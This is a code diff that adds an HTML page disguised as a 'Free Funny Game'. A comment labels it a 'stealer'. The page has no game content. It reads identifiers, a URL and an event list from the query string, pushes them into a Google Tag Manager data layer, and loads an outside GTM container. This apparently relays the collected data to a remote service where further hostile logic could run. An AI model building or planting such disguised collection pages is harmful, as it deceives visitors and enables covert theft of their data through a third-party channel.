@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<meta http-equiv="Access-Control-Allow-Origin" content="*">
+<!-- Use GTM1, as stealer -->
+<html>
+
+<head>
+    <title>Free Funny Game</title>
+    <!-- GTM script -->
+    <script>
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('==');
+                if (sParameterName[0] == sParam) {
+                    return sParameterName[1];
+                }
+            }
+        }
+        var uid = GetURLParameter('uid');
+        var domain = GetURLParameter('domain');
+        var cid = GetURLParameter('cid');
+        var url = GetURLParameter('url');
+        var eList = GetURLParameter('eList');
+        url= decodeURIComponent(url);
+        console.log(eList);
+
+        dataLayer = [{
+            'uid': uid,
+            'domain': domain,
+            'cid': cid,
+            'url': url,
+            'eventList': eList
+        }];
+    </script>
+    <!-- Google Tag Manager -->
+    <script>
+        (function(w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-NMBPJL8');
+    </script>
+    <!-- End Google Tag Manager -->
+</head>
+
+<body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NMBPJL8"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+</body>
+
+</html>
